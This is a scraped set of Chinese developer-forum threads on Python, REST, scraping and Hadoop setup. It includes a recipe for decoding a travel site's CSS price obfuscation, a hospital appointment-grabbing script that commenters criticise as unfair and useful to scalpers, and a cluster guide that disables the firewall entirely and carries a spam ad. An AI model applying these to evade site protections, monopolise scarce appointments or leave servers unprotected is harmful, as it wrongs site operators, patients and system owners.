{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>去哪儿价格返回的是 html ，通过 css 定位，显示出价格。</p>\n<pre><code>&lt;div class=\"qt-light-orange qt-font20 qunar_mix\"&gt;\n      &lt;span class=\"price\" style=\"width:33px\"&gt;\n      &lt;i class=\"qm18d6dd7e\"&gt;2&lt;/i&gt; \n      &lt;i class=\"qmacf0943b\"&gt;2&lt;/i&gt; \n      &lt;i class=\"qm11251921\"&gt;2&lt;/i&gt; \n      &lt;i class=\"qm5c6d111c\"&gt;5&lt;/i&gt; \n      &lt;i class=\"qmbd09efa2\"&gt;8&lt;/i&gt;&lt;/span&gt;\n    &lt;/div&gt;\n</code></pre>\n<p>css 如下：</p>\n<pre><code>.qunar_mix span.price i {\n    position: absolute;\n    left: 0;\n    bottom: -1px;\n    font-style: normal;\n    background: #f0f0f0;\n    height: 100%;\n}\n.qunar_mix span.price i.qm5c6d111c{left: -100px; margin-left:300px;background:none;}\n.qunar_mix span.price i.qmcf5711c8{left: -100px; margin-left:22px; padding-left:22px; background:none;}\n.qunar_mix span.price i.qmbd09efa2{left: 0px; margin-left:11px; padding-left:11px; background:none;}\n.qunar_mix span.price i.qm18d6dd7e{left: -33px; margin-left:11px; padding-left:33px; background:none;}\n.qunar_mix span.price i.qm11251921{left: -22px; margin-left:11px; padding-left:11px; background:none;}\n.qunar_mix span.price i.qmca340bd1{left: 11px; margin-left:11px; padding-left:11px; background:none;}\n.qunar_mix span.price i.qmc1c11156{left: 11px; margin-left:22px; padding-left:11px; background:none;}\n.qunar_mix span.price i.qmacf0943b{left: -100px; padding-left:300px;background:none;}\n</code></pre>\n<p>最终显示的价格是 228 ，如何通过 css 来计算得到的价格呢。能想到的就是通过 phantomjs 渲染后截图，然后图片识别可以，但是效率不高</p>\n</div></div>"], "reply": "9", "tittle": "去哪儿 m 版酒店价格获取，如何通过 css 计算元素的绝对定位", "comment": ["去哪儿这招有点狠 ...", "不显示.qunar_mix span.price i.qm5c6d111c{left: -100px; margin-left:300px;background:none;}\r", "200\r", "\r", "无 html.qunar_mix span.price i.qmcf5711c8{left: -100px; margin-left:22px; padding-left:22px; background:none;}\r", "-56\r", "\r", "显示.qunar_mix span.price i.qmbd09efa2{left: 0px; margin-left:11px; padding-left:11px; background:none;}\r", "22\r", "\r", "显示.qunar_mix span.price i.qm18d6dd7e{left: -33px; margin-left:11px; padding-left:33px; background:none;}\r", "11\r", "\r", "显示.qunar_mix span.price i.qm11251921{left: -22px; margin-left:11px; padding-left:11px; background:none;}\r", "0\r", "\r", "无 html.qunar_mix span.price i.qmca340bd1{left: 11px; margin-left:11px; padding-left:11px; background:none;}\r", "33\r", "\r", "无 html.qunar_mix span.price i.qmc1c11156{left: 11px; margin-left:22px; padding-left:11px; background:none;}\r", "44\r", "\r", "不显示.qunar_mix span.price i.qmacf0943b{left: -100px; padding-left:300px;background:none;}\r", "200\r", "\r", "加法\r", "然后去除 html 中没有的\r", "然后去除过界的\r", "然后根据加的结果数值排序。", " 有效，感谢", "不明觉厉，好奇怎么生成这样的 css", "去哪儿我也抓过，不需要这样的，它的价格隐藏在返回的 html 的某个属性里，你认真观察下就知道了", " <div class=\"qt-light-orange qt-font20 qunar_mix\">\r", "      <span class=\"price\" style=\"width:33px\">\r", "      <i class=\"qm18d6dd7e\">2</i> \r", "      <i class=\"qmacf0943b\">2</i> \r", "      <i class=\"qm11251921\">2</i>\r", "      <i class=\"qm5c6d111c\">5</i> \r", "      <i class=\"qmbd09efa2\">8</i></span>\r", "    </div> 这就是返回的 html ，差不多半年前我也看过，是可以直接看到价格的，最近应该改了", "…用读屏软件的遇到这些真是…", "它不怕被搜索引擎降权么", "反爬的丧心病狂啊"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>请求权限映射</h2>\n<p>根据RESTful的相关风格规范, 我们将请求映射为以下几种操作</p>\n<pre><code>GET     /users/                -----&gt;  `list.users` \nGET     /users/:id/            -----&gt;  `retrieve.users`\nPOST    /users/                -----&gt;  `create.users`\nPUT     /users/:id/password/   -----&gt;  `replace.users`\nPATCH   /users/:id/            -----&gt;  `update.users`\nDELETE  /users/:id/            -----&gt;  `destroy.users`\n</code></pre>\n<h2>权限控制器映射</h2>\n<p>如果后端以MVC模式进行开发, 那么我们可以映射如下控制器</p>\n<pre><code>`list.users`        -----&gt;  list(users) \n`retrieve.users`    -----&gt;  retrieve(user,id)  \n`create.users`      -----&gt;  create(users)       \n`replace.users`     -----&gt;  replace(users,id,field)   \n`update.users`      -----&gt;  update(users,id)           \n`destroy.users`     -----&gt;  destroy(users,id)           \n</code></pre>\n<h2>鉴权流程</h2>\n<p>权限的管理采用传统的RBAC模式</p>\n<ol>\n<li>身份验证,返回具体user或者anonymous,接下来我们把这一步返回的user都作为正常user</li>\n<li>验证请求权限,即上述验证请求权限映射</li>\n<li>验证资源存在性与所属权, 这里存在争议．\n<ul>\n<li>如果放到控制器之前, 那么可能会出现格外数据库查询,同时会增加代码上的复杂性, 但是可以把所有鉴权过程放到一起．</li>\n<li>如果放到控制器中，鉴权过程分开了，由于不同的资源可能有不同的所属权判断标准，这样可以增加灵活性．</li>\n</ul>\n</li>\n</ol>\n<h2>讨论点</h2>\n<ol>\n<li>资源存在性与所属权放到控制器里还是作为中间件放到控制器之前？</li>\n<li>请求权限映射有哪些需要改进的地方？</li>\n<li>能否将整个认证鉴权流程规范化？</li>\n</ol>\n</div></div>"], "reply": "24", "tittle": "一种新的 RESTful 权限设计讨论", "comment": ["并没觉得新在哪里。\r", "\r", "我们的做法：功能权限前置，数据权限后置（对应你这里资源权限）。\r", "\r", "现在想想，设计良好的系统也可以做到数据权限前置，而不会（明显）增加查询次数。比如，将数据权限中的查询结果透传给控制器。", " 数据权限前置我发现的最大问题就是不同类型的资源可能有不同的判断方式，如果针对不同资源写不同方法，前置的意义也就不大了", " 对，会丧失一定的灵活性。通常数据权限的判断逻辑非常复杂多样。所以要综合权衡一下利弊。", " 市面上现在似乎没有鉴权规范化的项目", "1. RESTful 标准中 PATCH 的语义是 update/replace ， PUT 的语义是 update/modify 。我认为用一个 PUT 方法就可以，没必要多一个 PATCH ，少一接口，多一份放心。很多 API 都没有实现 PATCH 方法，都是用 PUT 实现的。\r", "\r", "2. 我觉得放在控制器中比较好。一般来说中间件是一种通用的解决方案，权限控制又是一种十分复杂而且多变的。作为一个中间件，没有任何复用性可言。", "不是 PUT 添加， POST 修改吗", " 童鞋，你确定你看的不是假文档？", " POST 添加， PUT 修改， PUT 的 URL 指向**唯一**资源\r", "\r", " PATCH 可以是 partial entity ， PUT 不行，所以这里还是有区别的", " @", " 哈，找到了说明 ", "其实这样写 性能低，有测试过，在解析 url 时候", " yes ，只要你知道资源的唯一 URL 就无论添加还是修改都行，但如果只知道一个 collection 的 URL 就不行", " 也就是将权限验证绑定到控制器里效率更高？", " 就是单单测试 url 性能，{id}get 和 get?id=xx\r", "这两种比较。权限可以在 filter 或者 interseter 里面判断。反正都是 具体功能前的，而且最佳就是加上权限缓存。", "反正我不用 resetful 规范，因为业务多了就不优雅了。", "话说 PATCH 好像不支持 formdata 吧？有图片上传的操作这个的话就比较麻烦了", " 文件上传通常是统一做成单独的接口，以 Post 方式上传至 oss 或者其它地方，获取到返回的文件信息后再用于其它接口", " 可以说一下你现在使用的规范吗", "最好设计上保持鉴权逻辑的通用和统一 ，然后鉴权前置。\r", "\r", "至于所说的多一次数据库查询问题，可以把鉴权时查询到的数据放到一个当前请求的 context 中，业务逻辑如有需要，可以直接使用这个 context 中的数据，请求结束数据根据 context 一起销毁。", " 这样会不会增加客户端的工作？这样做法 客户端所有涉及文件 的都 得先上转 oss 再把回来的信息 post 到服务器上\r", "\r", "之前我也有想过这个方式 ，但好像会增加客户端的工作量，之后就没有这样做了\r", "\r", "给写入方法都 是用 POST + formdata 实现", "1. 使用用 OAuth/OpenID 或者 JWT 时，返回的 Token 中都可以添加一个 scopes ，在用户登录时取得该用户所有的权限。与服务器交互一般都是 Stateless 方式去请求 API ， Header 加上 Token 。\r", "2. 服务器端解密 Token ， 可以得到该用户分配的所有权限。直接对照检测 API 权限就行了。\r", "\r", "上述方法与所用语言无关。", "没觉得新在哪啊， apache shiro 不就在干这事吗，不过那个是 java 的", " Patch 已经有相关的具体标准 JSON Patch 等，去修改 Entity 部分属性。\r", "\r", "\r", "\r", "之前我用到了 Spring Sync 支持 Patch 。 \r", "\r", "\r", "\r", "下一代的 JAXRS 2.1 （ Java EE 8 标准）会加入官方的 Patch 支持（虽然自己实现不难）。", "权限\r", "如果你是了解 spring mvc,权限验证可以放在 interceptor\r", "http->tomcat->interceptor(check user is login and auth resource)->biz_service\r", "restful 风格,感觉它只是给了一个指导,实际需要我们自己拓展.\r", "我建议使用 biz_group/biz_add or other 数据放在 post 中\r", "因为在复杂业务下,需要表达的含义远多于 crud,从可读代码上看", "我是觉得作为中间件放到控制器之前好，首先代码侵入性较小，其次只需要单独维护一套权限系统就行，只要简单修改就可以用到其它系统中，权限的验证无非是验证 + 回调，我不认为会增加复杂性，当然，会造成额外的数据查询这是个问题"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在网上看了几个内存泄露分析工具，都要 import 什么，或者加一个装饰器</p>\n<p>有没有那种直接在系统里运行，就能检测别的 python 进程内存使用情况的工具？</p>\n</div></div>"], "reply": "12", "tittle": "Python 程序内存占用越来越大，有没有办法直接查看对象数目，而不修改代码呢？", "comment": ["在系统里运行，你是说一个单独的 binary 文件？", " 也可以是别的 python 文件什么的，暂时没法重启那个 内存泄露的服务，更别说改代码了", "应该是有吧", "\r", "这里提到了一种向运行中的 Python 程序关联 shell 的方法，不确定是否对解决这一问题有帮助。", "systemtap 是一个好方法，但是需要编译 Python 的时候把一些点提前埋进去。我记得 CentOS 默认的 Python 是带的，可以直接用。其他系统 Python 需要自己打 patch 。\r", "\r", "3.6 之后编译加参数就行了。", "pyrasite-shell 或 flask 提供一个看 memory 的接口就可以", "检查内存泄漏很麻烦的，命令行程序的话你定时重启就完了", " 脚本看 scripts/memtrace.stp 就可以了", "看对象的数目是没有用的\r", "Leak 的对象在 python 里是看不见的", "这个时候就知道 Java 的好了，哈哈", "可以借助 pyrasite"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>有一个比较大的 json 文件。每一行都是一个单独的 json 文件。</p>\n<p>现在想单独对某些行的 json 文件进行修改。目前的想法是遍历每一行，判断是否是需要修改的，然后将这行保存到另一个文件中。</p>\n<p>现在想知道有没有办法可以在原文件里面直接修改想修改的部分？</p>\n<pre><code>\nwith open('test.json', r+) as f:\n\tfor line in f:\n    \tline = json.loads(line)\n    \tif line is target:\n\t\tline['sth'] = 'new'\n</code></pre>\n<p>有没有办法可以把修改后的 line 保存或者说替换原来的那行？\n谢谢！</p>\n</div></div>"], "reply": "8", "tittle": "json 修改问题", "comment": ["如果每一行修改前后所占用的 **字节数** 不变化则可以，你可以手动 seek 到需要修改的位置，写入新的内容，然后 seek 到下一个位置，依次类推，否则重建一个文件比较简单。", "可以\r", "n = 0 #n 为操作标记位置\r", "f.readline() #读取第一行\r", "n1 = n #保存上一个 n\r", "n = f.tell() #更新 n\r", "if 需要修改:\r", "  f.seek(n1) 返回上一个标记位置\r", "  f.writelines(\"内容\")\r", "\r", "大概就是这样", " 这样啊，谢谢！", "楼主搞定了，最好反馈一下，这样搞会不会快，快了多少", " 谢谢！\r", "\r", "这个方法是不是也要考虑一楼说的那个字节数要相同？我刚试了一下发现如果不一样的话会把后面的覆盖掉。", " 一楼二楼的做法都是在指定的字节数限制之内写新的内容，只是一楼是说每行字节数一致，二楼是说用代码来获取这一行的字节数。\r", "另外楼主如果你新的内容长度和原来不一致的话就不能用这种方法了。", " 哦哦，这样，明白了！谢谢！", "可能跑题了，但是如果不用 python ，可以直接用命令行里的 sed ，加个-i 就是在原文件修改了"]},
{"content": ["<div class=\"topic_content\">只能用 try except 把 float （ str ）包起来么</div>"], "reply": "6", "tittle": "Python 字符串转数字的问题", "comment": ["调 str 的方法检查是否为数字喽", "tryexcept 很正常的用法啊，为什么不用", " 浮点数就不管用了", "检查：数字、最多有一个小数点\r", "然后直接转就是喽", "你可以用正则表达式检查一下嘛，虽然还不如 try except 性能高", "Python 3.4:\r", "\r", "a_str = '...'\r", "from contextlib import suppress\r", "with suppress(Exception): a_str = float(a_str)\r", "\r", "# a_str 可转 float 的话到这里就是 float 了， 不能转就还是 str\r", "' %s 可转 float ：%s ' % (a_str, isinstance(a_str, float))\r", "\r", "E.g.：\r", "\r", "from contextlib import suppress\r", "\r", "a_str = 'abc'\r", "with suppress(Exception): a_str = float(a_str)\r", "' %s 可转 float ：%s ' % (a_str, isinstance(a_str, float))  $ False\r", "\r", "a_str = '3.4'\r", "with suppress(Exception): a_str = float(a_str)\r", "' %s 可转 float ：%s ' % (a_str, isinstance(a_str, float))  # True\r", "\r", "a_str = 'NaN'\r", "with suppress(Exception): a_str = float(a_str)\r", "' %s 可转 float ：%s ' % (a_str, isinstance(a_str, float))  # True\r", "\r", "a_str = 'Nan'\r", "with suppress(Exception): a_str = float(a_str)\r", "' %s 可转 float ：%s ' % (a_str, isinstance(a_str, float))  # True\r", "\r", "a_str = 'inf'\r", "with suppress(Exception): a_str = float(a_str)\r", "' %s 可转 float ：%s ' % (a_str, isinstance(a_str, float))  # True"]},
{"content": ["<div class=\"topic_content\">例如， array1 是一组数字，有正有负， array2 根据 array1 的值，如果是正，就是 True ，否则就是 False 。\r<br>应该有一种非常简便的方式实现，不需要 for 循环，请大家赐教，谢谢。</div>"], "reply": "4", "tittle": "numpy 和 pandas，如何通过一个数组的值确定另一个数组的值", "comment": ["array2 = map(lambda x: x>0, array1)", "numpy_array2 = numpy_array1>0", "\r", "自己举一反三吧", "=-=....  so easy\r", "\r", "In [1]: a = np.array([1,-1,1,-1])\r", "\r", "In [2]: b = (a > 0)\r", "\r", "In [3]: b\r", "Out[3]: array([ True, False,  True, False], dtype=bool)"]},
{"content": ["<div class=\"topic_content\">在 sublime text3 中会报： ImportError: cannot import name 'contextmanager'\r<br>但是在终端使用就没有问题\r<br>请各位大佬指教</div>"], "reply": "2", "tittle": "请问我在 sublime text3 中用 from contextlib import contextmanager 为什么会报错？", "comment": ["用的 Python3", "求教啊"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://github.com/DormyMo/SpiderKeeper\" rel=\"nofollow\">https://github.com/DormyMo/SpiderKeeper</a></p>\n<p>主要实现 scrapy 工程的部署，抓取任务状态监控，定时启动爬虫等功能</p>\n<p>支持多个 scrapyd 服务 ，方便爬虫集群的管理</p>\n<p>后续等功能完善了之后 想支持更多爬虫框架来着</p>\n</div></div>"], "reply": "13", "tittle": "用 scrapy 玩爬虫的这么多 ，遂写了个 scrapy 的管理界面，各位大佬瞧瞧", "comment": ["很厉害啊，用什么写的？", " flask", "看着比 scrapyd 要好用...", "v2 上真是爬虫玩家多 而且高端玩家多", "怒赞。", "windows 系统可以用不？", "第 111 个赞", " 应该可以，没测试过", " 👍", "ui 可以的", "哈哈，前排支持", "先赞一个！", "楼主强大，做成了我一直想做但却做不成的事，前排支持，然后给星"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>北京市预约挂号统一平台脚本</h1>\n<p>Copyright (C) 2017</p>\n<p><a href=\"https://github.com/iBreaker/bjguahao\" rel=\"nofollow\">https://github.com/iBreaker/bjguahao</a></p>\n<p><strong>目前还在调试中，没有稳定的版本，欢迎吐槽和试用</strong></p>\n<ul>\n<li>本程序用于 <a href=\"http://www.bjguahao.gov.cn/\" rel=\"nofollow\">北京市预约挂号统一平台</a> 的挂号，只支持北京地区医院的挂号。</li>\n<li>挂号是刚需。帝都有些医院号源紧张，放号瞬间被秒杀一空，遂产生了撸一脚本挂号的念头。说干就干，简单的分析和调试后于 16 年 8 月份左右产出第一版，顺利挂上了 XXX 院运动医学科的号。很开心。</li>\n<li>17 年 2 月底的时候，朋友也需要挂一个号，脚本给他改了改，貌似删了重写的？没有仔细看。经过精心的分析和调试，挂了一个专家号。很开心。</li>\n<li>17 年 3 月 8 号，两位热心网友 github 上发起 issues ，提出反馈，让我很意外。本来想着这脚本自己写着用就可以了。接到反馈后觉得可以写成一个成熟的软件了。两位热心网友也主动提出改进代码的愿望。很开心。</li>\n<li><strong>还看什么看，来贡献代码</strong> ;-)</li>\n</ul>\n<p><code>2017-03-08 17:12:20 breaker</code></p>\n<h2>环境</h2>\n<ul>\n<li>Python</li>\n</ul>\n<h2>配置文件</h2>\n<p>在脚本目录将 <code>_config.josn</code> 重命名为 <code>config.json</code>, 然后写入如下数据：</p>\n<pre><code>[\n    {\n        \"username\":\"185xxxxxxx\",\n        \"password\":\"*******\",\n        \"date\":\"2017-02-17\",            # 挂号日期\n        \"hospitalId\":\"142\",             # 142 北医三院\n        \"departmentId\":\"200039602\",     # 运动医学科\n        \"dutyCode\":\"1\",                 # 1:上午  2:下午\n        \"patientName\":\"张三\",           # 就诊人姓名,可不填,适配多就诊人情况\n\n\n        \"DebugLevel\":\"info\"             # debug / info / error\n    }\n]\n</code></pre>\n<h2>文档</h2>\n<p><a href=\"doc.md\" rel=\"nofollow\">文档</a> 中有比较详细的接口分析和装包。</p>\n<p><a href=\"ChangeLog.md\" rel=\"nofollow\">ChangeLog</a> release 版本更新内容</p>\n<h2>调试</h2>\n<p>开发者请将<code>config.json</code>配置文件中的<code>DebugLevel</code>参数设置为<code>debug</code></p>\n<h2>协议</h2>\n<p>bjguahao 基于 GPL-3.0 协议进行分发和使用，更多信息参见协议文件。</p>\n</div></div>"], "reply": "37", "tittle": "北京市预约挂号统一平台脚本", "comment": ["说句话鼓励一下啊", "板凳", "地板", "god ，怎么查医院 id 和科室 id ，如果要手动查。岂不是跟手动没啥区别了。只是方便频繁挂同一个医院同一个科室的，得了慢性长期病的人？", " 什么鬼   查的功能还没做，因为自己没有那个需求。希望有人可以完善这个功能啊", "这种脚本开源不好吧，你自己用吧。\r", "\r", "你把本来公平的预约行为变成了不公平的。", "现在都用京医通了，有注明放号时间，刷一刷，还是挺容易刷到的。", " 有些科室  不好挂，大部分都还挺好", "楼主好人，一生平安，赞一个！", "我觉得这事不太道德", "瞬间想起阿里月饼。。。", "抢一下挺好的", "支持", " 不道德？", "兹慈一下~", "你自己用就好了，放出来干嘛。。被人恶意刷票怎么办？这事不道德。。还是删了或者转成私有的吧\r", "虽然我也写了一个", " 大神好屌啊  好道德啊", "别被玩坏了", "走其他方式，不要走 web 了， web 上涉及短信验证码，其他渠道 ，例如 114 平台 或是 微信。。。不涉及短信验证码哦", "\"patientName\":\"张三\",           # 就诊人姓名,可不填,适配多就诊人情况\r", "呃， bj 还是这么干的？还没实名？", "流弊！之前给媳妇挂号老费劲了。。", "以后不会写程序的还能活吗? 就像农民工买火车票一样", "那个多配置文件支持就是号贩子的需求吧？", " 嘿嘿  不会的", " 是吗？我没试过   谢谢 v 友提醒", " 实名了  这只是一个配置文件的例子哦~", " 试试脚本", " 是啊~  啥都得抢", " 不知道啊~", "这个劝楼主不要开源，自己用用就好，更不要随意分享。你要想到有很多和自己父母年纪一样的外地人，带着希望千里迢迢的到帝都寻求最后的帮助，他们不舍得吃不舍得喝的挤在医院的大厅，带着让人看了都想落泪的自己最在乎的“病了的亲属”，他们不会软件，也不会脚本。而楼主的这个脚本却让不定数的人在病痛的折磨中等待着“迟到的希望”。如果这个被号贩子拿到了，不知道还有多少人要遭殃。技术是无害的（就像实验室培育艾滋病毒），但是刻意泄露就要考虑一下影响了。我们做技术的就好像会做刀一样，取决于你是要做菜刀，还是大砍刀。以上只是个人愚见，楼主或可采纳，或可置之不理", "世界有太多的不公平，能给最需要帮助的坚持着希望的人一些小小的公平，这也就够了", " 没想到有人会回复这么多字，只是做个小软件方便挂号。让大家用用罢了，想不到会有用 python 的号贩子。", "这么多玻璃心，贩子想搞自有贩子的专用软件，也不至于都来用楼主的代码。。。。", "  是啊  真是说什么的都有", " 不知道他们过年回家是不是坚持不用抢票软件", "#32 @", " 号贩子不会用 python ，就怕有用心之人卖给号贩子啊。", " 号贩子用的软件比我的先进多了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h3>使用<code>virtualenv</code>(虚拟化)进行项目管理</h3>\n<p><code>virtualenv</code>:可以创建一个单独的虚拟环境，安装私有包，而不会污染全局环境,它让你的电脑从项目目录而不是系统全局的<code>python</code>主目录下查找和安装包。\n使用<code>virtualenv</code>步骤如下(已经在<code>Linux(ubuntu)</code>上操作过，<code>window</code>还未实践)：</p>\n<p>1.虚拟环境使用第三方实用工具<code>virtualenv</code>创建，可以输入以下命令可以检查系统是否安装了<code>virtualenv</code>:</p>\n<pre><code>    virtualenv  --version\n</code></pre>\n<p>如果结果显示错误，那么你就需要安装这个工具</p>\n<p><strong>注意</strong>：<code>python3.3</code>通过 <code>venv</code> 模块原生支持虚拟环境，命令为<code>pyvenv</code>。<code>pyvenv</code>可以替代<code>virtualenv</code>。不过<strong>要注意</strong>，在<code>python3.3</code>中使用<code>pyvenv</code>命令创建的虚拟环境不包括<code>pip</code>，你需要手动安装。<code>python3.4</code>改进了这一缺陷，<code>pyvenv</code>完全可以替代<code>virtualenv</code>。</p>\n<ol>\n<li>大多数的 Linux 发行版都提供了<code>virtualenv</code>，例如 linux 用户可以使用下述命令安装\n<pre><code>sudo apt-get install python-virtualenv 或 pip install virtualenv\n</code></pre>\n如果你的电脑是 Mac OS X 系统，就可以使用 easy_install 安装 virtualenv\n<pre><code>sudo easy_install virtualenv\n</code></pre>\n如果你的 Window 系统或没有其它官方 virtualenv 的包的操作系统，那么安装过程要稍微复杂点，在浏览器中输入<a href=\"http://bitbucket.org/pypa/setuptools/\" rel=\"nofollow\">http://bitbucket.org/pypa/setuptools/</a> 回车后会进入<code>setuptools</code>安装程序的主页。在这个页面中华找到下载安装脚本的链接，脚本名为<code><a href=\"http://ez_setup.py\" rel=\"nofollow\">ez_setup.py</a></code>。把这个保存到电脑的一个临时文件夹中，然后在这个文件夹中执行以下我命令：\n<pre><code>    python ez_setup.py install\n    easy_install virtualenv\n</code></pre>\n</li>\n</ol>\n<p><strong>注意</strong>：上述命令必须具有管理员权限的用户身份执行，在 window 系统中，请使用 <strong>以管理员身份运行</strong>选项打开命令行窗口，在基于 Unix 中，要在上面两个命令前加上 <code>sudo</code>，或者以根用户身份执行，一旦安装完毕<code>virtualenv</code>实用工具就可以从常规账号中调用</p>\n<p><em>哈哈，说了这么多，还是一直在安讲安装，接下来我们就开始讲如何操作</em></p>\n<ol>\n<li>首先要使用<code>virtualenv</code>来初始化项目</li>\n</ol>\n<pre><code>    virtualenv env\n</code></pre>\n<p>后面的这个<code>env</code> 告诉 <code>virtualenv</code>，把所有的包都装在一个叫作<code>env</code>的文件夹里，这个文件夹保存的是一个全新的虚拟环境，\n2. 激活<code>virtualenv</code> 使用前需要激活这个环境，如果你是 <code>bash</code>命令行(Linux 和 Mac OS X 用户)，可以通过以下的命令来激活这个虚拟环境：</p>\n<pre><code>    source env\\bin\\activate\n</code></pre>\n<p>如果你是 window 用户，激活命令为；</p>\n<pre><code>    env/bin/activate\n</code></pre>\n<p>当虚拟环境被激活后， python 解释器的路径就被添加到了 PATH 中，但是这种环境不是永久的，它只会影响当前的命令行会话。为了提醒你已经激活了虚拟环境，激活虚拟环境的命令会修改命令行的提示符，加入环境名： <code>(evn)</code> $\n然后我们就可以在这个虚拟环境中愉快的装包了，不用担心会影响全局变量\n3. 退出 <code>virtualenv</code></p>\n<ul>\n<li>退出你只需要一个命令就能完成了，那就是<code>deactivate</code></li>\n</ul>\n<h3>转载需注明出处</h3>\n</div></div>"], "reply": "9", "tittle": "Virtualenv 的理解和使用", "comment": ["补充一个用 virtualenv 创建 py3 虚拟环境的方法：\r", "virtualenv -p python3 venv 。", " \r", "Python3 已经内置了 venv 模块，不需要 virtualenv 啦,\r", "\r", "python3 -m venv --help", " 谢谢。又学会一个方法。", " 请问下，如果服务器默认是 py2.7 ，现在我装了 py3 （服务器执行 python 依然是 2.7 ），那我现在想创建一个 py3 的项目， py3 自带的虚拟环境可以满足吗？", "Windows 下： scripts\\activate", "不试试 virtualenvwrapper?", " 安装 virtualenv 后，使用-p 指定 py 的版本的命令 \r", "virtualenv -p python3 venv\r", "肯定是可以的。#2 楼的方法，我还没有试，要不你试一下吧。", " 可以啊", " 哈哈，我现在也是用这种方法，该试试新技术了"]},
{"content": ["<div class=\"topic_content\">本文是将三台电脑用路由器搭建本地局域网，系统为 centos6.5,已经实验验证，搭建成功。\r<br>\r<br>一、设置静态 IP&amp;修改主机名&amp;关闭防火墙（ all-root ）（对三台电脑都需要进行操作）\r<br>\r<br>0.将三台电脑安装 centos6.5 系统\r<br>\r<br>1.设置静态 ip （便于机器之间的通信，防止路由器电脑重启后， ip 变化，导致不能通信）\r<br>vim /etc/sysconfig/network-scripts/ifcfg-eth0\r<br>DEVICE=eth0 #描述网卡对应的设备别名，例如 ifcfg-eth0 的文件中它为 eth0\r<br>BOOTPROTO=static #设置网卡获得 ip 地址的方式，可能的选项为 static ， dhcp 或 bootp ，分别对应静态指定的 ip 地址，通过 dhcp 协议获得的 ip 地址，通过 bootp 协议获得的 ip 地址\r<br>BROADCAST=192.168.0.255 #对应的子网广播地址\r<br>HWADDR=00:07:E9:05:E8:B4 #对应的网卡物理地址\r<br> 在文件最后面添加一下代码\r<br>IPADDR=192.168.80.100\r<br>NETMASK=255.255.255.0\r<br>NETWORK=192.168.0.0\r<br>里面的 IPADDR 地址设置你想要的，我这里是 192.168.80.100 。\r<br>设置好后，需要让 IP 地址生效，运行下面命令：\r<br>service network restart Shutting down interface\r<br>然后运行 ifconfig 就可以看到静态 ip 是否生效。\r<br>\r<br>2.修改主机名（每台电脑都要修改，建议使用 hadoop100,hadoop101,hadoop102,对应于 ip 地址最后面三位数）\r<br>vi /etc/sysconfig/network \r<br>hostname=hadoop100\r<br>重启一下网络 service network restart\r<br>验证 reboot -h now 立刻重启  然后 hostname\r<br>\r<br>3.关闭防火墙 \r<br>关闭已经启动的防火墙： service iptables stop （只能关闭当前）\r<br>验证： service iptables status\r<br>Firewall is not running\r<br>关闭防火墙开机自动启动功能：\r<br>（ 1 ）. 先查看 查看： chkconfig --list |grep iptables\r<br>iptables        0:off   1:off   2:on    3:on    4:on    5:on    6:off\r<br>（ 2 ）. 关闭 chkconfig  iptables off\r<br>验证： chkconfig --list |grep iptables\r<br>\r<br>4.建立 hadoop 运行帐号\r<br>最好不要使用 root 操作 hadoop,root 是超级管理员权限，不推荐各个机器之间使用 root 访问，\r<br>useradd hadoop 增加用户 \r<br>passwd hadoop 设置密码\r<br>\r<br>\r<br>二、配置 hosts 文件（只需要对主机 192.168.80.100 （ hadoop100 ）进行操作，然后通过 scp 命令将这些配置分发给其他电脑即可）\r<br>操作 192.168.80.100 机器\r<br>vi /etc/hosts   添加下面内容\r<br>192.168.80.100 hadoop100\r<br>192.168.80.101 hadoop101\r<br>192.168.80.102 hadoop102\r<br>验证： ping  hadoop100\r<br>ping  hadoop101\r<br>ping  hadoop102\r<br>\r<br> 三、为 hadoop 账户配置 ssh 免密码连入（只需对 hadoop100 操作）\r<br> 操作 hadoop100 机器\r<br>① ssh-keygen -t rsa 会在~/.ssh/文件夹下生成 id_rsa  id_rsa.pub 两个文件\r<br>② 根据 ip 分别执行\r<br>cp ~/.ssh/id_rsa.pub ~/.ssh/id_rsa.pub.100\r<br>cp ~/.ssh/id_rsa.pub ~/.ssh/id_rsa.pub.101\r<br>cp ~/.ssh/id_rsa.pub ~/.ssh/id_rsa.pub.102\r<br>③\r<br>scp -r ~/.ssh/id_rsa.pub.101   hadoop@hadoop100:/home/hadoop/.ssh\r<br>scp -r ~/.ssh/id_rsa.pub.102   hadoop@hadoop100:/home/hadoop/.ssh\r<br> \r<br>④ 把所有机器的公钥，放在 hadoop100 的一个文件中（在 hadoop100 的 hadoop 用户下操作）\r<br> cat ~/.ssh/id_rsa.pub.100 &gt;&gt; ~/.ssh/authorized_keys\r<br> cat ~/.ssh/id_rsa.pub.101 &gt;&gt; ~/.ssh/authorized_keys\r<br> cat ~/.ssh/id_rsa.pub.102 &gt;&gt; ~/.ssh/authorized_keys\r<br> \r<br>验证 ssh hadoop101  发现无效，提示还是需要密码。\r<br> \r<br>⑤ 修改 authorized_keys 的权限， 组用户不能有 写（ W ）权限， 不然 ssh 由于安全问题不生效\r<br>authorized_keys 权限改为 644 就 OK \r<br> \r<br>命令  chmod g-w authorized_keys\r<br> \r<br>然后分发给 101 和 102\r<br>scp -r ~/.ssh/authorized_keys   hadoop@hadoop101:/home/hadoop/.ssh\r<br>scp -r ~/.ssh/authorized_keys   hadoop@hadoop102:/home/hadoop/.ssh\r<br>验证： ssh hadoop101 ...\r<br>然后神奇的事情发生了。 3 台机器彼此之间可以互联。\r<br> （给大家分享一套 hadoop 大数据视频，我自己全部都看过，质量非常高。\r<br>授课老师是百度 hadoop 核心架构师 \r<br>内容包括 hadoop 入门、 hadoop 生态架构以及大型 hadoop 商业实战案例。 \r<br>讲的很细致， MapReduce 就讲了 15 个小时。 \r<br>学完后可以胜任 hadoop 的开发工作，很多人学的这个课程找到的工作。 \r<br>包括指导书、练习代码、和用到的软件都打包了\r<br>有想学 hadoop 的免费送给你，加我徽信 ganshiyu1026 下载，备注 V2 ）\r<br>\r<br>四、下载并解压 jdk （只需对 hadoop100 操作）\r<br>使用 root 用户进行操作，把 jdk 解压到 /usr/local/ 文件夹中。\r<br>[root@hadoop100 local]#  cd /usr/local\r<br>[root@hadoop100 local]#  ./jdk-6u30-linux-x64.bin 解压 jdk 后，生成 jdk1.6.0_30 